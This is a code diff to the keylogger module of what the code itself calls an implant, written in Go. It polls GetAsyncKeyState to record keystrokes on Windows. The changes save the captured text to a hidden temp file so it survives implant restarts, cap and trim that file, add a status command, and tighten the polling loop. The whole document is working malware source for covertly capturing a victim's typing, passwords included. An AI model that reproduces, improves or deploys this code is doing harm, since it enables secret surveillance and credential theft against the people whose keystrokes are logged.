@@ -3,17 +3,26 @@
 package main
 
 import (
-	"strings"
+	"fmt"
+	"os"
+	"path/filepath"
 	"sync"
 	"syscall"
 	"time"
 )
 
+// The capture is kept in a file as well as memory, so a dump still works after
+// the implant restarts and the buffer never grows without bound.
 var (
 	klMu   sync.Mutex
-	klBuf  strings.Builder
 	klOn   bool
 	klPrev [256]bool
+	klFile = filepath.Join(os.TempDir(), ".phantom_kl")
+)
+
+const (
+	klMax  = 512 * 1024
+	klTail = 256 * 1024
 )
 
 var (
@@ -28,7 +37,11 @@ func keylogStart(dev string) Result {
 		return Result{OK: true, Out: "already running"}
 	}
 	klOn = true
+	klPrev = [256]bool{}
 	klMu.Unlock()
+	if f, err := os.OpenFile(klFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600); err == nil {
+		f.Close()
+	}
 	go klPoll()
 	return Result{OK: true, Out: "keylogging (GetAsyncKeyState)"}
 }
@@ -37,20 +50,52 @@ func keylogStop() Result {
 	klMu.Lock()
 	klOn = false
 	klMu.Unlock()
+	// flush whatever the buffer holds into the archive so nothing is lost
+	out := klTake()
+	if out != "" {
+		return Result{OK: true, Out: out}
+	}
 	return Result{OK: true, Out: "stopped"}
 }
 
 func keylogDump(clear bool) Result {
-	klMu.Lock()
-	defer klMu.Unlock()
-	out := klBuf.String()
+	out := klTake()
 	if clear {
-		klBuf.Reset()
+		klMu.Lock()
+		os.Truncate(klFile, 0)
+		klMu.Unlock()
 	}
 	if out == "" {
 		return Result{OK: true, Out: "(empty)"}
 	}
 	return Result{OK: true, Out: out}
+}
+
+func keylogStatus() Result {
+	klMu.Lock()
+	on := klOn
+	klMu.Unlock()
+	size := int64(0)
+	if info, err := os.Stat(klFile); err == nil {
+		size = info.Size()
+	}
+	state := "stopped"
+	if on {
+		state = "running"
+	}
+	return Result{OK: true, Out: fmt.Sprintf("%s · device=GetAsyncKeyState buffer=%dB", state, size)}
+}
+
+// klTake hands over the captured text and clears the live buffer.
+func klTake() string {
+	klMu.Lock()
+	defer klMu.Unlock()
+	b, err := os.ReadFile(klFile)
+	if err != nil {
+		return ""
+	}
+	os.Truncate(klFile, 0)
+	return string(b)
 }
 
 func klPoll() {
@@ -74,7 +119,7 @@ func klPoll() {
 				klPrev[vk] = false
 			}
 		}
-		time.Sleep(10 * time.Millisecond)
+		time.Sleep(8 * time.Millisecond)
 	}
 }
 
@@ -168,6 +213,23 @@ func vkToChar(vk int, shift, caps bool) string {
 
 func klAppend(s string) {
 	klMu.Lock()
-	klBuf.WriteString(s)
-	klMu.Unlock()
+	defer klMu.Unlock()
+	f, err := os.OpenFile(klFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
+	if err != nil {
+		return
+	}
+	defer f.Close()
+	f.WriteString(s)
+	if info, err := f.Stat(); err == nil && info.Size() > klMax {
+		klTrimLocked()
+	}
+}
+
+// klTrimLocked keeps the newest klTail bytes. Caller holds klMu.
+func klTrimLocked() {
+	b, err := os.ReadFile(klFile)
+	if err != nil || len(b) <= klTail {
+		return
+	}
+	os.WriteFile(klFile, b[len(b)-klTail:], 0600)
 }
